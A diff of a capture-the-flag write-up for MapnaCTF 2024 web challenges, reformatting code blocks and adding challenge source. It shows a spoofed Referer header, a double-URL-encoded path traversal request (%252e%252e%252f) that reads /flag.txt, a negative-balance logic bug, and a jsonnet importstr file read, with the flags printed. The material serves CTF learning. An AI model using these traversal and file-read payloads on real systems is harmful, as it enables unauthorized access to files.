@@ -10,17 +10,17 @@ solved by {% person hartmannsyg %}
 ## Flag Holding
 
 We are given a website:
-```
+{% ccb terminal:true %}
 http://18.184.219.56:8080/
-```
+{% endccb %}
 
 ![You are not coming from "http://flagland.internal/".](/static/MapnaCTF2024/flag_holding.png)
 
 We then set the Referer header to http://flagland.internal/:
 
-```http
+{% ccb terminal:true lang:http %}
 Referer: http://flagland.internal/
-```
+{% endccb %}
 ```html
 	<div class="msg" style="">
 		Unspecified "secret".	</div>
@@ -28,14 +28,14 @@ Referer: http://flagland.internal/
 
 We create a url parameter called `secret`: http://18.184.219.56:8080?secret=
 
-```html
+{% ccb lang:html gutter1:1,2, wrapped:true %}
 <div class="msg" style="">
 		Incorrect secret. <!-- hint: secret is ____ which is the name of the protocol that both this server and your browser agrees on... -->	</div>
-```
+{% endccb %}
 
 the protocol is http, so http://18.184.219.56:8080?secret=http with the header gives us:
 
-```
+```html
 	<div class="msg" style="">
 		Sorry we don't have "GET" here but we might have other things like "FLAG".	</div>
 ```
@@ -67,28 +67,40 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 X-Requested-With: XMLHttpRequest
 ```
 
-We want to read /flag.txt, but our `/read` call must evaluate to a `/public` directory. So instead of doing `http://3.64.250.135:9000/api/read/public/../../../../flag.txt`, we can *double url encode* the `../` to become `%252e%252e%252f`
+We want to read /flag.txt, but our `/read` call must evaluate to a `/public` directory (or at least it must start with `/public`):
+{% ccb lang:py gutter1:43-50 caption:main.py highlight:4 %}
+@app.get('/api/read/<path:name>')
+def readNovel(name):
+    name = unquote(name)
+    if(not name.startswith('public/')):
+        return {'success': False, 'msg': 'You can only read public novels!'}, 400
+    buf = readFile(name).split(' ')
+    buf = ' '.join(buf[0:session['words_balance']])+'... Charge your account to unlock more of the novel!'
+    return {'success': True, 'msg': buf}
+{% endccb %}
 
-```http
+So instead of doing `http://3.64.250.135:9000/api/read/public/../../../../flag.txt`, we can *double url encode* the `../` to become `%252e%252e%252f`
+
+{% ccb lang:http wrapped:true %}
 GET /api/read/public/%252e%252e%252f%252e%252e%252fflag.txt HTTP/1.1
-```
-```json
+{% endccb %}
+{% ccb lang:json wrapped:true gutter1:1,2,,3,4 %}
 {
   "msg": "MAPNA{uhhh-1-7h1nk-1-f0r607-70-ch3ck-cr3d17>0-4b331d4b}\n\n... Charge your account to unlock more of the novel!",
   "success": true
 }
-```
+{% endccb %}
 
 ## Novel Reader 2
 
 We can use the same double url encoding trick to read `A-Secret-Tale.txt`, but we seem to not have enough words, even when we charge the number of words to 11 (remember to update the Cookie header if you are writing code to send the request)
 
-```json
+{% ccb lang:json wrapped:true gutter1:1,2,,3,4 %}
 {
   "msg": "Once a upon time there was a flag. The flag was... Charge your account to unlock more of the novel!",
   "success": true
 }
-```
+{% endccb %}
 
 We look at the specific line of code that is blocking us from accessing the flag:
 
@@ -117,12 +129,12 @@ So if we deduct and deduct until our `words_balance` is `-1`, we get:
 
 ![Words Balance: -1](/static/MapnaCTF2024/novel_reader.png)
 
-```json
+{% ccb lang:json wrapped:true gutter1:1,2,,3,4 %}
 {
   "msg": "Once a upon time there was a flag. The flag was read like this: MAPNA{uhhh-y0u-607-m3-4641n-3f4b38571}.... Charge your account to unlock more of the novel!",
   "success": true
 }
-```
+{% endccb %}
 
 (remember to update the Cookie header if you are writing code to send the request)
 
@@ -156,7 +168,7 @@ So I tried importstr
 {"wow so advanced!!": importstr "flag.txt"}
 ```
 and got
-```
+```json
 {
    "wow so advanced!!": "MAPNA{5uch-4-u53ful-f347ur3-a23f98d}\n\n"
 }
